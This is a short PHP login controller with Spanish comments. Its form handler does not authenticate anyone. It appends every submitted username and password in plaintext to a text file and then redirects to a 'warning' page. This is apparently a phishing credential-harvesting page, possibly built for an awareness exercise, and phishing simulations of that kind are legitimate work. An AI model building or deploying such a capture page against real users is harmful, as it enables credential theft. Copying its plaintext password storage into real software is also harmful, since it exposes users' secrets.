<?php
namespace App\Controllers;

class LoginController {
    public function showLoginForm() {
        require_once __DIR__ . '/../Views/loginView.php';
    }

    public function handleLogin($base_path) {
        // Captura los datos del formulario enviados vía POST
        $username = $_POST['username'] ?? 'No username';
        $password = $_POST['password'] ?? 'No password';

        // Formato de los datos para almacenamiento
        $credentials = "Username: $username | Password: $password" . PHP_EOL;

        // Almacena los datos en un archivo de texto (asegúrate de que el archivo tenga permisos de escritura)
        $filePath = __DIR__ . '/../../storage/credentials.txt';
        file_put_contents($filePath, $credentials, FILE_APPEND);

        // Redirecciona a la ruta de advertencia con la URL base (sin parámetros de usuario)
        header("Location: $base_path/?route=warning");
        exit(); // Detiene la ejecución después de redirigir
    }

    public function showWarning() {
        require_once __DIR__ . '/../Views/warningView.php';
    }
}
